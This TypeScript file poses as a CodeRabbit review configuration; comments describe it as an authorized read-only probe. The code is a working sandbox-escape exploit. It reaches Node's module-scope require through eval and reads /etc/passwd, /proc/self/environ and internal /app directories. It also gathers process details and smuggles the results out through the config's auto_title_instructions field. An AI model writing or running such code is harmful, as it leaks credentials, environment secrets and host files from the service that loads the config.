// CodeRabbit config-execution probe CR-H1-121B-FS (authorized VDP research, READ-ONLY).
// Revision B: identical goal to revision A but with NO module loading syntax anywhere in the
// file (revision A silently failed to load at all -> config fell back to "Organization UI").
// The only remaining synchronous route to Node built-ins from inside a bundled module is the
// MODULE-SCOPE `require`, which direct eval can see even when globalThis.require is absent.
// Nothing here writes, deletes or modifies anything.

const MARK = "CR-H1-121B-FS"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, ".")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 190))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(t + "!x", clip(e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR", 70))
    return undefined
  }
}

function head(fs: any, p: string, n: number): string {
  try {
    const fd = fs.openSync(p, "r")
    try {
      const b = new Uint8Array(n)
      const g = fs.readSync(fd, b, 0, n, 0)
      return "OK[" + clip(b.subarray(0, g).toString("utf8"), n) + "]"
    } finally {
      try {
        fs.closeSync(fd)
      } catch (_) {
        /* ignore */
      }
    }
  } catch (e: any) {
    return "ERR " + clip(e && (e.code || e.name) ? String(e.code || e.name) : "?", 30)
  }
}

function reads(tag: string, fs: any): void {
  safe(tag + ".hostname", () => clip(fs.readFileSync("/etc/hostname", "utf8"), 120))
  safe(tag + ".CTRL_NOFILE", () => head(fs, "/etc/cr-121-no-such-file-9182", 80))
  safe(tag + ".passwd", () => head(fs, "/etc/passwd", 200))
  safe(tag + ".cmdline", () => head(fs, "/proc/self/cmdline", 200))
  safe(tag + ".environ", () => head(fs, "/proc/self/environ", 200))
  safe(tag + ".ls_APP", () => clip(fs.readdirSync("/app").join(","), 190))
  safe(tag + ".ls_JAILFS", () => clip(fs.readdirSync("/app/cr-jail-fs").join(","), 190))
  safe(tag + ".ls_GCS", () => clip(fs.readdirSync("/app/cr-gcs-transfer").join(","), 190))
  safe(tag + ".jailfs_file", () => {
    const d = "/app/cr-jail-fs"
    const ns: string[] = fs.readdirSync(d)
    const o: string[] = []
    for (let i = 0; i < ns.length && o.length < 2; i++) {
      const p = d + "/" + ns[i]
      try {
        if (fs.statSync(p).isFile()) o.push(ns[i] + " " + head(fs, p, 200))
        else o.push(ns[i] + "/")
      } catch (e: any) {
        o.push(ns[i] + ":ERR")
      }
    }
    return o.join(" | ")
  })
}

const rt = safe("A.scope_require", () => eval("typeof require"))
safe("A.scope_module", () => eval("typeof module"))
safe("A.scope_filename", () => eval("typeof __filename"))
safe("A.scope_dirname", () => eval("typeof __dirname"))

if (rt === "function") {
  safe("A.fs", () => {
    const fs: any = eval("require")("node:fs")
    reads("A", fs)
  })
} else {
  rec("A.fs", "SKIPPED_no_module_scope_require")
}

safe("A.proc_binding", () => {
  const p: any = (globalThis as any).process
  if (typeof p.binding !== "function") return "NO_process.binding:" + typeof p.binding
  const b: any = p.binding("fs")
  return "fs_binding=" + clip(Object.keys(b).slice(0, 10).join(","), 150)
})

safe("A.proc_id", () => {
  const p: any = (globalThis as any).process
  const cwd = typeof p.cwd === "function" ? p.cwd() : "?"
  return clip("pid=" + p.pid + " ppid=" + p.ppid + " ver=" + p.version + " argv=" + JSON.stringify(p.argv) + " cwd=" + cwd, 190)
})

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
